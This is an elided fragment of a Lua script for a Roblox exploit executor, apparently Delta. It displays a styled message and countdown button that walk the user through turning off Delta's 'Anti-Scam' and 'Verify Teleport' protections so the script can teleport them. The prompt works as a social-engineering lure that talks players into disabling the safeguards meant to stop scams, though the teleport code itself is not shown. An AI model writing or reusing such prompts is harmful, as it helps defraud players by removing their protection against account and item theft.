...
if executor == "Delta" then
    ...
    desc.Text = [[ The script requires teleport permission, which is currently blocked by Delta's <font color="#FFD700">Anti-Scam</font>. 1) Tap the Delta icon at the top. 2) Open Settings (gear icon). 3) Turn <font color="#FF0000">OFF</font> the "<font color="#FFD700">Anti-Scam</font>" & "<font color="#FFD700">Verify Teleport</font>" option. 4) Rejoin and run the script again. ]]
    desc.RichText = true
    ...
    openButton.Text = "Click to Open the Script (5.0s)"
    ...
    task.spawn(function()
        ...
        while countdown > 0 do
            openButton.Text = string.format("Click to Open the Script (%.1fs)", countdown)
            task.wait(0.1)
            countdown = countdown - 0.1
        end
        openButton.Text = "Click to Open the Script"
